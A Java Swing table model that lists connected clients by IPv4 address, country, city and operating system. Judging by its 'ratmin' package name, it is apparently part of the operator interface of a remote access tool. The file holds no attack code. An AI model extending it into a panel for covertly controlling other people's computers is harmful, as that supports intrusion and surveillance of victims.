package me.slimig.ratmin.user_interface.Ui;

import javax.swing.table.DefaultTableModel;

public class ClientTableModel extends DefaultTableModel {
    
    private static final long serialVersionUID = -2553197890792009479L;

    private final Object[] columns = {
            "Ipv4", "Country", "City", "OS",
    };

    @SuppressWarnings("rawtypes")
    private final Class[] columnClass = new Class[]{
            javax.swing.JLabel.class, java.lang.String.class, java.lang.String.class, java.lang.String.class, java.lang.String.class, java.lang.String.class, java.lang.String.class, java.lang.String.class
    };

    private final boolean[] canEdit = new boolean[]{
            false, false, false, false, false, false, false, false
    };

    public ClientTableModel() {
        for (Object column : columns)
            this.addColumn(column);
    }

    @Override
    public Class<?> getColumnClass(int columnIndex) {
        return columnClass[columnIndex];
    }

    @Override
    public boolean isCellEditable(int rowIndex, int columnIndex) {
        return canEdit[columnIndex];
    }
}